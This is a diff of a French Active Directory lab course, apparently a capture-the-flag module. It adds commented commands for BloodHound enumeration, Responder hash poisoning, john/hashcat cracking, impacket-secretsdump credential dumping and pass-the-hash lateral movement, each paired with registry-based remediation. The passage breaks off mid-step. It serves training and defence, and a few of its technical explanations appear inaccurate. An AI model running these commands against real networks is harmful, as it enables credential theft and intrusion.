@@ -249,25 +249,31 @@ L'ingestor `bloodhound-python` se connecte au contrôleur de domaine via LDAP (p
 #### 5.1.3 Commande
 
 ```bash
-# Syntaxe complète
+# Syntaxe complète de la commande bloodhound-python
+# bloodhound-python est l'ingestor (collecteur) de données pour BloodHound
+# Il se connecte au contrôleur de domaine via LDAP (port 389) pour interroger l'annuaire
 bloodhound-python \
     -d corp.shadow.local \
     -ns 10.10.10.10 \
     -c all \
     -o /tmp/bloodhound_output
-
-# Décomposition des options :
-#   -d       : Nom du domaine cible
-#   -ns      : Serveur DNS (le DC)
-#   -c all   : Collecte toutes les informations disponibles
-#              (groupes, sessions, ACL, trusts, etc.)
-#   -o       : Répertoire de sortie pour les fichiers JSON
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `bloodhound-python` | Ingestor BloodHound pour Linux ; collecte les données AD (utilisateurs, groupes, ordinateurs, ACL, sessions) via LDAP et les exporte au format JSON |
+| `-d corp.shadow.local` | **Domain** : spécifie le nom de domaine Active Directory cible |
+| `-ns 10.10.10.10` | **Name Server** : adresse IP du serveur DNS (ici le contrôleur de domaine DC01) utilisé pour résoudre les noms du domaine |
+| `-c all` | **Collection** : collecte tous les types de données disponibles (groupes, sessions, ACL, trusts, utilisateurs, ordinateurs, etc.) |
+| `-o /tmp/bloodhound_output` | **Output** : répertoire de destination pour les fichiers JSON générés |
 
 **Variante si l'accès anonyme est désactivé (nécessite un compte) :**
 
 ```bash
 # Avec authentification (une fois le flag 2 obtenu)
+# On utilise les identifiants de jdoe récupérés via le crack du hash NTLMv2
 bloodhound-python \
     -d corp.shadow.local \
     -ns 10.10.10.10 \
@@ -277,13 +283,24 @@ bloodhound-python \
     -o /tmp/bloodhound_output
 ```
 
+**Explication des options supplémentaires :**
+
+| Option | Rôle/Explication |
+|--------|------------------|
+| `-u jdoe` | **Username** : nom d'utilisateur du domaine pour s'authentifier auprès du contrôleur de domaine |
+| `-p 'P@ssw0rd!2025'` | **Password** : mot de passe en clair de l'utilisateur (obtenu après crack du hash NTLMv2 au flag 2) |
+
 #### 5.1.4 Exécution
 
 ```bash
 # Étape 1 : Créer le répertoire de sortie
+# mkdir -p crée le dossier et ses parents si nécessaire (option -p = parents)
+# On stocke les fichiers JSON dans /tmp pour éviter de polluer le système de fichiers
 mkdir -p /tmp/bloodhound_output
 
 # Étape 2 : Lancer l'ingestor BloodHound
+# bloodhound-python se connecte au DC via LDAP pour collecter la topologie AD
+# Les données sont exportées en JSON pour analyse dans l'interface BloodHound
 bloodhound-python \
     -d corp.shadow.local \
     -ns 10.10.10.10 \
@@ -291,27 +308,61 @@ bloodhound-python \
     -o /tmp/bloodhound_output
 
 # Étape 3 : Vérifier les fichiers générés
+# ls -la liste les fichiers avec leurs permissions, propriétaire, taille et date
 ls -la /tmp/bloodhound_output/
-# Output attendu :
-#   - 20250530_*****_users.json
-#   - 20250530_*****_groups.json
-#   - 20250530_*****_computers.json
-#   - 20250530_*****_acls.json
+# Output attendu : 4 fichiers JSON contenant les objets AD collectés
+#   - 20250530_*****_users.json      → Liste de tous les utilisateurs du domaine
+#   - 20250530_*****_groups.json     → Liste de tous les groupes (Domain Admins, etc.)
+#   - 20250530_*****_computers.json  → Liste de toutes les machines du domaine
+#   - 20250530_*****_acls.json       → Permissions ACL entre les objets AD
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `mkdir -p /tmp/bloodhound_output` | Crée le dossier de sortie ; `-p` évite une erreur si le dossier existe déjà et crée les parents manquants |
+| `bloodhound-python ...` | Ingestor BloodHound : collecte les données AD via LDAP et les exporte en JSON |
+| `ls -la /tmp/bloodhound_output/` | Liste le contenu du dossier ; `-l` = format long (permissions, taille, date), `-a` = fichiers cachés inclus |
 
 #### 5.1.5 Import dans BloodHound (interface graphique)
 
 ```bash
-# Lancer Neo4j (base de données)
+# === INSTALLATION DE BLOODHOUND (première fois uniquement) ===
+sudo apt install -y neo4j bloodhound
+sudo neo4j start
+# Au premier lancement, Neo4j demande de changer le mot de passe.
+# Navigateur → http://localhost:7474 → login: neo4j / password: neo4j
+# Définir un nouveau mot de passe (ex: bloodhound) puis lancer BloodHound :
+bloodhound &
+```
+
+```bash
+# Lancer Neo4j (base de données graphique)
+# Neo4j est le moteur de base de données qui stocke les relations entre objets AD
+# sudo est nécessaire car Neo4j écoute sur des ports privilégiés (7687, 7474)
 sudo neo4j start
 
-# Lancer BloodHound (interface)
+# Lancer BloodHound (interface graphique Electron)
+# Le '&' place le processus en arrière-plan pour libérer le terminal
+# BloodHound se connecte à Neo4j et permet de visualiser les chemins d'attaque
 bloodhound &
+```
 
-# Dans BloodHound :
-# 1. Cliquer sur "Upload Data"
-# 2. Sélectionner tous les fichiers .json dans /tmp/bloodhound_output/
-# 3. Analyser les chemins d'attaque
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `sudo neo4j start` | Démarre le service Neo4j (base de données graphe) ; `sudo` requis pour les droits d'administration système |
+| `bloodhound &` | Lance l'interface BloodHound (Electron) en arrière-plan avec `&` pour libérer le terminal |
+
+```text
+Dans BloodHound :
+1. Cliquer sur "Upload Data" → Importer les fichiers JSON collectés
+2. Sélectionner tous les fichiers .json dans /tmp/bloodhound_output/
+3. Analyser les chemins d'attaque : BloodHound calcule les relations
+   (membres de groupes, sessions, ACL, etc.) et propose des chemins
+   pour atteindre des privilèges élevés
 ```
 
 #### 5.1.6 Flag attendu
@@ -323,20 +374,32 @@ FLAG{Module10_bloodhound_a1b2c3d4}
 #### 5.1.7 Analyse post-exercice — Remédiation
 
 ```powershell
-# Désactiver l'accès LDAP anonyme (à exécuter sur le DC)
+# Désactiver l'accès LDAP anonyme (à exécuter sur le contrôleur de domaine DC01)
+# Set-ItemProperty modifie une valeur dans le registre Windows
+# Le chemin HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters pointe vers
+# la configuration du service NTDS (Active Directory Domain Services)
+# LDAPServerIntegrity = 2 force l'intégrité LDAP et bloque les requêtes anonymes
 Set-ItemProperty `
     -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
     -Name "LDAPServerIntegrity" `
     -Value 2
 
-# Vérifier l'accès anonyme
+# Vérifier la clé de registre : Get-ItemProperty lit la valeur pour confirmer
+# qu'elle a bien été modifiée (vérification post-exploitation)
 Get-ItemProperty `
     -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
     -Name "LDAPServerIntegrity"
-
-# Alternative : via Active Directory Administrative Center
-# Désactiver "Enable LDAP over SSL" et restreindre les requêtes anonymes
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `Set-ItemProperty` | Modifie une propriété dans le registre Windows (équivalent PowerShell de `regedit`) |
+| `-Path "HKLM:\...\NTDS\Parameters"` | Chemin de la ruche registre contenant la configuration du service Active Directory (NTDS) |
+| `-Name "LDAPServerIntegrity"` | Nom de la valeur registre qui contrôle l'intégrité des requêtes LDAP |
+| `-Value 2` | Valeur 2 = activer l'intégrité LDAP (bloque les requêtes anonymes) |
+| `Get-ItemProperty` | Lit une valeur du registre pour vérification |
 
 ---
 
@@ -372,56 +435,108 @@ Ce hash peut être **cracké hors ligne** (offline) avec des outils comme `john`
 
 ```bash
 # Étape 1 : Lancer Responder en mode empoisonnement
-sudo responder -I eth0 -rdwv
-
-# Options :
-#   -I       : Interface réseau à écouter
-#   -r       : Répondre aux requêtes NBT-NS (NetBIOS Name Service)
-#   -d       : Activer le mode DHCP
-#   -w       : Répondre aux requêtes WPAD (Web Proxy Auto-Discovery)
-#   -v       : Mode verbeux (affiche chaque requête)
+# sudo = exécution avec privilèges root (nécessaire pour le sniffing réseau)
+# responder écoute sur l'interface réseau et empoisonne les requêtes LLMNR/NBT-NS/mDNS
+# Quand une machine tente de résoudre un nom inexistant, Responder usurpe l'identité
+# et capture le hash NTLMv2 envoyé par le client pour s'authentifier
+# Ou remplacer par votre interface (ip addr show pour lister)
+sudo responder -I $(ip route get 1.1.1.1 | awk '{print $5; exit}') -rdwv
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `sudo` | Élévation de privilèges root (nécessaire pour la capture de paquets réseau brut) |
+| `responder` | Outil d'empoisonnement LLMNR/NBT-NS/mDNS qui capture les hashes NTLMv2 |
+| `-I eth0` | **Interface** : nom de l'interface réseau à écouter (eth0 est l'interface Ethernet principale sur Kali) |
+| `-r` | **Respond NBT-NS** : répondre aux requêtes NetBIOS Name Service (port UDP 137) |
+| `-d` | **DHCP** : activer le mode DHCP pour répondre aux requêtes de configuration réseau |
+| `-w` | **WPAD** : répondre aux requêtes Web Proxy Auto-Discovery (forcer le trafic HTTP à passer par l'attaquant) |
+| `-v` | **Verbose** : mode verbeux ; affiche chaque requête reçue en temps réel dans le terminal |
 
 **Simulation côté utilisateur (sur WS01 via PowerShell) :**
 
 ```powershell
-# L'utilisateur fait une faute de frappe dans un chemin UNC
-# Ceci déclenche une requête LLMNR
+# L'utilisateur fait une faute de frappe dans un chemin UNC (Universal Naming Convention)
+# Au lieu de taper le bon nom de serveur, il tape un nom qui n'existe pas
+# Windows tente d'abord une résolution DNS, puis LLMNR (multicast)
+# Responder, qui écoute le réseau, répond à la requête LLMNR en usurpant l'identité
 net use \\FAUX_SERVEUR\partage
 ```
+
+**Explication :**
+
+| Commande | Rôle/Explication |
+|----------|------------------|
+| `net use \\FAUX_SERVEUR\partage` | Mappe un lecteur réseau sur un chemin UNC inexistant ; déclenche une résolution de nom LLMNR que Responder va empoisonner |
 
 #### 5.2.4 Capture du hash
 
 ```bash
-# Responder affichera un résultat similaire à :
-#
-# [SMB] NTLMv2-SSP Hash captured from 10.10.10.100
-# Username : CORPSHADOW\jdoe
-# Hash     : jdoe::CORPSHADOW:1122334455667788:0123456789abcdef0123456789abcdef:0101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+# Responder affichera un résultat similaire dans le terminal :
+# [SMB]     → Le protocole utilisé pour la capture (SMB : Server Message Block)
+# NTLMv2-SSP → Type de hash capturé (NTLMv2 avec Security Support Provider)
+# from 10.10.10.100 → Adresse IP de la machine victime (WS01)
+# Username : CORPSHADOW\jdoe → Nom d'utilisateur complet (domaine\nom)
+# Hash :      → Le hash NTLMv2 complet au format challenge-réponse
+# Structure du hash : utilisateur::domaine:challenge:response:HMAC-MD5
+#   - jdoe            : nom d'utilisateur
+#   - CORPSHADOW      : nom du domaine
+#   - 1122334455667788 : challenge NTLM (8 octets hexadécimaux)
+#   - 0123456789...   : preuve HMAC-MD5 (prouve la connaissance du mot de passe)
 
-# Les logs sont également sauvegardés :
+# Les logs sont sauvegardés automatiquement par Responder
+# Le dossier /usr/share/responder/logs/ contient tous les hashes capturés
+# Utile pour analyse ultérieure ou pour cracker après la session
 ls -la /usr/share/responder/logs/
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `ls -la /usr/share/responder/logs/` | Liste les fichiers de log de Responder ; `-l` = format détaillé, `-a` = fichiers cachés ; les hashes capturés y sont stockés avec horodatage |
 
 #### 5.2.5 Crack du hash
 
 ```bash
-# Étape 1 : Copier le hash dans un fichier
-echo 'jdoe::CORPSHADOW:1122334455667788:0123456789abcdef0123456789abcdef:0101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' > /tmp/ntlmv2_hash.txt
+# Étape 1 : Copier le hash NTLMv2 dans un fichier texte pour le crack
+# echo affiche la chaîne entre quotes et > redirige la sortie vers un fichier
+# Le hash NTLMv2 est stocké dans /tmp/ntlmv2_hash.txt pour traitement par john
+echo 'jdoe::CORPSHADOW:1122334455667788:0123456789abcdef0123456789abcdef:0101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' > /tmp/ntlmv2_hash.txt
 
-# Étape 2 : Cracker avec john (mode wordlist)
+# Étape 2 : Cracker le hash avec john (John the Ripper) en mode wordlist
+# Décompresser rockyou.txt si nécessaire (Kali uniquement)
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
+# --wordlist spécifie le dictionnaire à utiliser (rockyou.txt = liste de mots de passe courants)
+# john essaie chaque mot du dictionnaire en calculant le hash correspondant
+# et le compare au hash capturé (attaque par dictionnaire)
 john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/ntlmv2_hash.txt
 
-# Étape 3 : Afficher le résultat
+# Étape 3 : Afficher le résultat du crack
+# --show affiche les mots de passe trouvés pour les hashes du fichier
+# Format de sortie : utilisateur:mot_de_passe:domaine:challenge:response
 john --show /tmp/ntlmv2_hash.txt
 # Output attendu :
 # jdoe:P@ssw0rd!2025:CORPSHADOW:1122334455667788:0123456789abcdef...
 # 1 password hash cracked, 0 left
+# → Le mot de passe de jdoe est P@ssw0rd!2025
 
-# Alternative avec hashcat (si GPU disponible)
+# Alternative avec hashcat (plus rapide si GPU disponible)
+# -m 5600 : mode hash = NetNTLMv2 (format spécifique pour NTLMv2)
+# --force : ignorer les avertissements de compatibilité GPU/OpenCL
 hashcat -m 5600 /tmp/ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt --force
-# -m 5600 : mode NTLMv2 (NetNTLMv2)
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `echo '...' > /tmp/ntlmv2_hash.txt` | Écrit le hash NTLMv2 dans un fichier ; `>` redirige la sortie (écrase si fichier existe) |
+| `john --wordlist=... /tmp/ntlmv2_hash.txt` | **John the Ripper** : craqueur de mots de passe ; `--wordlist` = chemin du dictionnaire (`rockyou.txt` contient ~14 millions de mots de passe courants) |
+| `john --show /tmp/ntlmv2_hash.txt` | Affiche les mots de passe déjà crackés pour les hashes du fichier spécifié |
+| `hashcat -m 5600 ... --force` | **Hashcat** : craqueur GPU-accéléré ; `-m 5600` = mode NetNTLMv2 ; `--force` = ignorer les avertissements |
 
 #### 5.2.6 Flag attendu
 
@@ -432,34 +547,43 @@ FLAG{Module10_responder_e5f6g7h8}
 #### 5.2.7 Analyse post-exercice — Remédiation
 
 ```powershell
-# Désactiver LLMNR via GPO (recommandé)
+# Désactiver LLMNR via GPO (recommandé - mesure de sécurité critique)
+# LLMNR (Link-Local Multicast Name Resolution) est un protocole de secours
+# pour la résolution de noms. Il n'est pas nécessaire dans un domaine AD
+# disposant d'un DNS fonctionnel. Sa désactivation empêche l'empoisonnement.
 
-# 1. Ouvrir la Gestion des stratégies de groupe (GPMC)
-# 2. Créer ou modifier une GPO au niveau du domaine
-# 3. Aller dans :
-#    Configuration ordinateur > Modèles d'administration > Réseau > Client DNS
-# 4. Activer le paramètre "Désactiver la résolution de noms multidiffusion (LLMNR)"
-#    Valeur : Activé
-
-# Équivalent PowerShell :
+# Équivalent PowerShell (modification directe du registre local) :
+# Set-ItemProperty modifie la valeur EnableMulticast dans la clé DNSClient
+# EnableMulticast = 0 désactive complètement LLMNR sur la machine
+# Le chemin HKLM:\SOFTWARE\Policies\Microsoft... correspond à la GPO locale
 Set-ItemProperty `
     -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" `
     -Name "EnableMulticast" `
     -Value 0
 
-# Désactiver NBT-NS via les paramètres réseau
-# Panneau de configuration > Centre réseau > Modifier les paramètres de la carte
-# > Propriétés TCP/IPv4 > Avancé > WINS > Désactiver NetBIOS sur TCP/IP
-
-# Pour les serveurs : désactiver complètement SMBv1
+# Disable-WindowsOptionalFeature désactive une fonctionnalité Windows optionnelle
+# -Online = agit sur le système en cours d'exécution (pas une image offline)
+# -FeatureName smb1protocol = SMBv1 (obsolète, dangereux, jamais nécessaire)
 Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol
 
-# Activer SMB Signing pour prévenir le relay
+# Activer SMB Signing pour prévenir les attaques de relay NTLM
+# RequireSecuritySignature = 1 force la signature SMB (empêche la modification
+# des paquets SMB en transit et bloque les attaques de type SMB Relay)
 Set-ItemProperty `
     -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
     -Name "RequireSecuritySignature" `
     -Value 1
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `Set-ItemProperty -Path HKLM:\... -Name EnableMulticast -Value 0` | Désactive LLMNR dans le registre (0 = désactivé) ; `HKLM` = HKEY_LOCAL_MACHINE |
+| `HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient` | Chemin registre de la politique DNS ; les clés sous `Policies` écrasent les valeurs par défaut |
+| `EnableMulticast` | Valeur registre qui contrôle LLMNR ; 0 = désactivé, 1 = activé |
+| `Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol` | Désinstalle SMBv1 (protocole obsolète et non sécurisé) ; `-Online` = système actif |
+| `Set-ItemProperty ... RequireSecuritySignature -Value 1` | Active la signature SMB obligatoire (empêche le relay et le tamisage des paquets SMB) |
 
 ---
 
@@ -492,64 +616,98 @@ Set-ItemProperty `
 #### 5.3.3 Commande
 
 ```bash
-# Syntaxe de base
+# Syntaxe de base de la commande impacket-secretsdump
+# impacket-secretsdump fait partie de la suite Impacket (bibliothèque Python)
+# Il se connecte à la machine cible via SMB (port 445) et extrait les hashes
+# depuis les ruches de registre (SAM, SYSTEM, SECURITY) à distance
 impacket-secretsdump \
     CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.20
-
-# Décomposition :
-#   CORPSHADOW/jdoe        : Compte de domaine
-#   :'P@ssw0rd!2025'       : Mot de passe en clair
-#   @10.10.10.20           : Adresse de la cible (FS01)
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `impacket-secretsdump` | Outil Impacket d'extraction de hashes à distance via SMB/registre ; implémente le dump SAM/LSA/DC |
+| `CORPSHADOW/jdoe` | Compte de domaine au format `DOMAINE/utilisateur` pour l'authentification SMB |
+| `:'P@ssw0rd!2025'` | Mot de passe en clair (obtenu au flag 2) ; les guillemets simples évitent l'interprétation des caractères spéciaux par le shell |
+| `@10.10.10.20` | Adresse IP de la cible (FS01 — le serveur de fichiers) ; le `@` sépare les identifiants de la cible |
 
 **Variantes utiles :**
 
 ```bash
-# Extraction complète (SAM + LSA + cache)
+# Extraction complète (SAM + LSA + cache domaine)
+# Par défaut, secretsdump extrait :
+#   - SAM (comptes locaux)
+#   - SYSTEM (clé de déchiffrement du SAM)
+#   - SECURITY (cache du domaine LSA)
 impacket-secretsdump \
     CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.20
 
-# Extraction uniquement du SAM
+# Extraction uniquement du SAM (Security Account Manager)
+# -sam limite l'extraction à la base SAM (comptes locaux uniquement)
+# Utile pour cibler uniquement les comptes locaux sans les données LSA
 impacket-secretsdump \
     CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.20 \
     -sam
 
-# Extraction avec hash au lieu de mot de passe
+# Extraction avec hash au lieu de mot de passe en clair
+# -hashes :<NTLM_HASH> permet de s'authentifier avec le hash NTLM
+# (technique Pass-the-Hash intégrée à secretsdump)
+# : avant le hash = LM hash vide (désactivé)
 impacket-secretsdump \
     -hashes :<NTLM_HASH> \
     CORPSHADOW/jdoe@10.10.10.20
 ```
 
+**Explication des variantes :**
+
+| Option | Rôle/Explication |
+|--------|------------------|
+| `-sam` | Limite l'extraction à la base SAM (comptes locaux uniquement) ; évite le bruit des données LSA |
+| `-hashes :<NTLM_HASH>` | Authentification par hash NTLM (Pass-the-Hash) ; le `:` avant le hash indique un LM hash vide (format standard) |
+
 #### 5.3.4 Exécution
 
 ```bash
-# Lancer le dump
+# Lancer le dump complet des hashes sur FS01 (10.10.10.20)
+# secretsdump se connecte via le partage ADMIN$ (SMB) pour accéder au registre distant
+# Il extrait les ruches SAM, SYSTEM et SECURITY, puis les déchiffre localement
 impacket-secretsdump \
     CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.20
+```
 
-# Output attendu (extrait) :
-#
-# Impacket v0.12.0 - Copyright 2022 Fortra
-#
-# [*] Target system IP: 10.10.10.20
-# [*] Scanning service 445 (SMB)
-# [*] Service SAM            : connecté
-# [*] Service SYSTEM         : connecté
-# [*] Service SECURITY       : connecté
-# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-# DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-# jdoe:1001:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH_JDOE>:::
-#
-# [*] Dumping cached domain logon info (uid:encrypted hash:domain)
-# CORPSHADOW\Administrator:IMCEAABgBk... :corp.shadow.local
-# CORPSHADOW\jdoe:IMCEAABgBk... :corp.shadow.local
-#
-# [*] Dumping LSA secrets
-# $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:<MACHINE_HASH>
-# corp.shadow.local\jdoe: <NTLM_HASH_JDOE>
-# corp.shadow.local\Administrator: <NTLM_ADMIN_HASH>
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `impacket-secretsdump CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.20` | Extrait les hashes de FS01 via SMB en utilisant les identifiants de `jdoe` |
+
+```text
+Output attendu (extrait) — Analyse détaillée :
+
+Impacket v0.12.0 - Copyright 2022 Fortra
+[*] Target system IP: 10.10.10.20           → Cible = FS01
+[*] Scanning service 445 (SMB)              → Connexion au port SMB
+[*] Service SAM            : connecté       → Accès à la ruche SAM réussi
+[*] Service SYSTEM         : connecté       → Accès à la ruche SYSTEM (clé de déchiffrement)
+[*] Service SECURITY       : connecté       → Accès à la ruche SECURITY (cache domaine)
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+    → Format : nom: RID:LM_HASH:NT_HASH:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    → RID 500 = compte Administrateur intégré (toujours)
+    → LM hash = aad3b435b51404eeaad3b435b51404ee (vide = LM désactivé)
+    → NT hash = 31d6cfe0d16ae931b73c59d7e0c089c0 (hash du mot de passe vide = compte désactivé)
+Guest:501:...                               → RID 501 = compte Invité (désactivé)
+DefaultAccount:503:...                      → RID 503 = compte par défaut
+jdoe:1001:...:<NTLM_HASH_JDOE>:::           → RID 1001+ = comptes locaux créés manuellement
+
+[*] Dumping cached domain logon info        → Cache des connexions domaine
+    → Contient les hashes des utilisateurs du domaine qui se sont connectés à FS01
+
+[*] Dumping LSA secrets                      → Secrets LSA (mots de passe stockés)
+$MACHINE.ACC: ...:<MACHINE_HASH>            → Hash du compte machine (nom d'ordinateur)
+corp.shadow.local\Administrator: <NTLM_ADMIN_HASH>  → Hash de l'admin du domaine (en cache)
 ```
 
 #### 5.3.5 Flag attendu
@@ -562,37 +720,51 @@ FLAG{Module10_secretsdump_i9j0k1l2}
 
 ```powershell
 # Activer la protection LSA (Windows Defender Credential Guard)
-# Cela empêche l'extraction des hashes de la mémoire LSASS
+# Credential Guard isole la partie sensible de LSASS dans un conteneur virtualisé
+# Même avec un accès administrateur, l'attaquant ne peut pas extraire les hashes
+# de la mémoire LSASS (protection matérielle via virtualisation)
 
 # Via le registre :
+# New-Item crée une nouvelle clé de registre (LsaCfgFlags sous Lsa)
+# -Force : crée la clé si elle n'existe pas, sans erreur
 New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
     -Name "LsaCfgFlags" -Force
+
+# Set-ItemProperty définit la valeur de la clé LsaCfgFlags
+# Valeur 1 = Credential Guard activé avec verrouillage UEFI (recommandé)
 Set-ItemProperty `
     -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
     -Name "LsaCfgFlags" `
     -Value 1
 
-# Valeurs possibles :
-#   0 : Désactivé (vulnérable)
-#   1 : Activé avec UEFI lock
-#   2 : Activé sans UEFI lock
-
-# Restreindre l'accès distant au registre
+# Restreindre l'accès distant au registre Windows
+# SecurePipeServers\winreg contrôle les accès au registre via le réseau
+# RemoteRegAccess = 1 limite l'accès aux administrateurs authentifiés
 Set-ItemProperty `
     -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg" `
     -Name "RemoteRegAccess" `
     -Value 1
 
-# Activer Windows Defender Credential Guard via GPO
-# Configuration ordinateur > Modèles d'administration
-# > Système > Credential Guard > Activer la protection Credential Guard
-
-# Désactiver le stockage des mots de passe en texte clair en WDigest
+# Désactiver le stockage des mots de passe en texte clair via WDigest
+# WDigest est un fournisseur d'authentification qui stocke les mots de passe
+# en clair en mémoire pour les versions anciennes de Windows
+# UseLogonCredential = 0 désactive ce comportement dangereux
 Set-ItemProperty `
     -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
     -Name "UseLogonCredential" `
     -Value 0
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `New-Item -Path HKLM:\... -Name "LsaCfgFlags" -Force` | Crée la clé de registre `LsaCfgFlags` sous `Control\Lsa` ; `-Force` = écraser si existant |
+| `Set-ItemProperty ... -Name "LsaCfgFlags" -Value 1` | Active Credential Guard ; 1 = avec UEFI lock (nécessite redémarrage) |
+| `HKLM:\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg` | Clé registre contrôlant l'accès distant au registre |
+| `RemoteRegAccess = 1` | Restreint l'accès distant au registre aux seuls administrateurs |
+| `HKLM:\...\SecurityProviders\WDigest` | Clé registre du fournisseur d'authentification WDigest (obsolète, dangereux) |
+| `UseLogonCredential = 0` | Empêche WDigest de stocker le mot de passe en clair en mémoire |
 
 ---
 
@@ -628,48 +800,80 @@ Le **Pass-the-Hash (PtH)** est une technique qui permet de s'authentifier sur un
 
 ```bash
 # Syntaxe avec wmiexec (recommandé — le plus furtif)
+# wmiexec utilise WMI (Windows Management Instrumentation) via RPC (port 135)
+# pour exécuter des commandes à distance, sans créer de service ou fichier sur le disque
+# C'est la méthode la plus discrète pour le mouvement latéral
 impacket-wmiexec \
     -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> \
     CORPSHADOW/jdoe@10.10.10.20
+```
 
-# Décomposition :
-#   -hashes <LM_HASH>:<NT_HASH>
-#           LM_HASH = aad3b435b51404eeaad3b435b51404ee (hash vide = LM désactivé)
-#           NT_HASH = hash NTLM du compte
-#   CORPSHADOW/jdoe@10.10.10.20
-#           Utilisateur et cible
+**Explication des options :**
 
-# Variante avec psexec (plus bruyant — crée un service)
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `impacket-wmiexec` | Outil Impacket d'exécution de commandes à distance via WMI (ports 135/RPC + 445/SMB) |
+| `-hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>` | Authentification par hash NTLM : `LM_HASH:NT_HASH` ; le LM hash `aad3b435b51404eeaad3b435b51404ee` est la valeur pour "hash vide" (LM désactivé) |
+| `CORPSHADOW/jdoe@10.10.10.20` | Compte de domaine `jdoe` visant la machine `10.10.10.20` (FS01) |
+
+```bash
+# Variante avec psexec (plus bruyant — crée un service Windows)
+# psexec copie un fichier sur ADMIN$ et crée un service Windows pour l'exécution
+# Génère des événements 7045 (création de service) et 4688 (création de processus)
 impacket-psexec \
     -hashes :<NTLM_HASH> \
     CORPSHADOW/jdoe@10.10.10.20
 
-# Variante avec smbexec (également via SMB)
+# Variante avec smbexec (également via SMB mais plus furtif que psexec)
+# smbexec utilise SVCCTL (Service Control Manager) via SMB pour créer un service
+# temporaire, mais sans copier de fichier sur le disque (exécution en mémoire via BITS)
 impacket-smbexec \
     -hashes :<NTLM_HASH> \
     CORPSHADOW/jdoe@10.10.10.20
 ```
 
+**Explication des variantes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `impacket-psexec -hashes :<NTLM_HASH> ...` | Version Impacket de PsExec : copie un binaire sur ADMIN$ + crée un service (bruyant, facile à détecter) |
+| `impacket-smbexec -hashes :<NTLM_HASH> ...` | Exécution via SVCCTL sans copie de fichier (plus furtif que psexec) |
+| `:<NTLM_HASH>` | Format court du hash : le LM hash vide est sous-entendu (équivalent à `aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>`) |
+
 #### 5.4.4 Exécution
 
 ```bash
 # Étape 1 : Récupérer le hash NTLM de l'administrateur local depuis le flag 3
-# Depuis l'output de secretsdump, chercher la ligne :
+# Dans l'output de secretsdump, chercher la ligne contenant RID 500 :
